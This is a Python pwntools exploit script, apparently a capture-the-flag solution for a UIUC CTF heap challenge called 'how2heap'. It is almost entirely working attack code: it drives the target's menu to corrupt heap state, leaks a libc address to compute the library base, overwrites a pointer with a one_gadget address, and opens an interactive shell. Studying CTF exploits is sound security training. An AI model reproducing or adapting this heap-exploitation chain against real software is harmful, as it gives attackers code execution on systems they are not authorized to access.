#!/usr/bin/python
from pwn import *
import sys
context(log_level='debug')
print sys.argv
DEBUG=1
if DEBUG:
	p=process('./how2heap')#,aslr=False)
else:
	p=remote('challenges1.uiuc.tf', 38910)
def lineup():
	p.recvuntil('Choice: ')
	p.sendline('0')
def makenew(name,age):
	p.recvuntil('Choice: ')
	p.sendline('2')
	p.recvuntil('name?')
	p.sendline(name)
	p.recvuntil('age?')
	p.sendline(str(age))
def delt():
	p.recvuntil('Choice: ')
	p.sendline('3')
def countt():
	p.recvuntil('Choice: ')
	p.sendline('1')
makenew('cpegg1',100)
makenew('cpegg2',-2)
makenew('cpegg3',99)

script= 'b *0x0000555555554FE6\n'+\
		'b *0x0000555555554DAE\n'+\
		'c\n'+\
		'teles $rbp-0x118 49'
		# print menu end
		# makenew end
		
		# makenew end
		#'b *0x0000555555554e1F\n'+\
		#'b *0x0000555555554ED4\n'+\
		# delt begin
		#'b *0x0000555555554DAF\n'+\
		#list->age = cha->age; *list->name = v4;
countt()
delt()
delt()

lineup()
# delt()


makenew('deadbeef',17)# index


delt()
delt()

# gdb.attach(p,script)
if DEBUG:
	libcbase=u64(p.recvuntil(', the old')[1:-9].ljust(8,'\x00'))-0x20830
else:
	p.recvuntil('\n')
	libcbase=u64(p.recvuntil(', the old')[0:-9].ljust(8,'\x00'))-0x211c1
log.info("libcbase: 0x%x"%libcbase)
print '------------------------------1'
countt()
print '------------------------------2'

lineup()
print '------------------------------3'

delt()
delt()
print '------------------------------4'

makenew('deadbeef',-3)
if DEBUG:
	onegadget=0x45216
else:
	onegadget=0x47c46
makenew(p64(libcbase+onegadget),libcbase+onegadget)
# makenew('cpeggx',p64(libcbase+))
context.log_level='CRITICAL'
p.interactive()
